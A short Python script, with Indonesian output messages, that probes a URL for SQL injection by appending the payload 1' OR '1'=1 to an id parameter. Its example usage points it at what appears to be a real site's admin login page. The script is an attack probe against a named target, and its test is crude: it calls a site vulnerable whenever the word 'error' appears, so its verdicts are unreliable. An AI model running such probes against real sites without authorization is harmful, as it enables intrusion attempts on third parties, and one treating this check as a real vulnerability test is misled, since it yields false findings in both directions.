import requests
def scan_sql_injection(url):
    try:
        payload = "1' OR '1'=1"
        target_url = f"{url}?id={payload}"
        response = requests.get(target_url)

        if 'error' in response.text.lower():
            print(f"URL: {target_url} Mungkin rentan terhadap SQLI.")
        else:
            print(f"URL: {target_url} Tidak rentan terhadap SQLI.")
    except requests.RequestException as e:
        print(f"error: {e}")

if __name__=="__main__":
    #Contoh Penggunaan
    website_url = "https://summitcontrol.com/admin/login.php"
    
    scan_sql_injection(website_url)